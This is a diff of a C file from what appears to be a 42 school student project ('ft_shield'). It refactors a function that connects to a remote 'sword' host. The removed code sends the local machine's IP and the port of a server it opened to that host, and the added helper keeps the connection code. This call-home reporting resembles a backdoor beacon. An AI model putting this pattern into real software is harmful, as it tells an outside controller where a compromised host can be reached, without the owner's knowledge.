@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/02 21:38:42 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/03 00:35:37 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -54,7 +54,29 @@ int	unlock_file(t_ctx *ctx)
 	return (1);
 }
 
-void	send_host_to_sword(int server_port)
+int	get_sword_fd()
+{
+	struct sockaddr_in	server_addr;
+	int					socket_fd;
+
+	memset(&server_addr, 0, sizeof(server_addr));
+	socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+	if (socket_fd == -1)
+		return (-1);
+
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons(SWORD_PORT);
+	inet_pton(AF_INET, SWORD_IP, &server_addr.sin_addr);
+
+	if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1)
+	{
+		close(socket_fd);
+		return (-1);
+	}
+	return (socket_fd);
+}
+
+void	send_host_to_sword(t_ctx *ctx, int server_port)
 {
 	char host_buffer[256];
 	char *ip_buffer;
@@ -73,28 +95,7 @@ void	send_host_to_sword(int server_port)
 	if (!ip_buffer)
 		return ;
 
-	char	buf[4096];
-	(void)host_buffer;
-	sprintf(buf, "%s %d\n", ip_buffer, server_port);
-
-	struct sockaddr_in	server_addr;
-	int					socket_fd;
-
-	memset(&server_addr, 0, sizeof(server_addr));
-	socket_fd = socket(AF_INET, SOCK_STREAM, 0);
-
-	server_addr.sin_family = AF_INET;
-	server_addr.sin_port = htons(SWORD_PORT);
-	inet_pton(AF_INET, SWORD_IP, &server_addr.sin_addr);
-
-	if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1)
-	{
-		close(socket_fd);
-		return ;
-	}
-
-	send(socket_fd, buf, strlen(buf) + 1, 0);
-	close(socket_fd);
+	logger_log(ctx, LOG_INFO, "Running ft_shield on %s (%s) %d\n", ip_buffer, host_buffer, server_port);
 }
 
 int	ctx_init(t_ctx *ctx)
@@ -151,7 +152,7 @@ int	ctx_init(t_ctx *ctx)
 	server_set_connect_hook(&ctx->server, connect_hook, ctx);
 	server_set_disconnect_hook(&ctx->server, disconnect_hook, ctx);
 	logger_log(ctx, LOG_INFO, "Server opened");
-	send_host_to_sword(server_port);
+	send_host_to_sword(ctx, server_port);
 	return (1);
 }
 
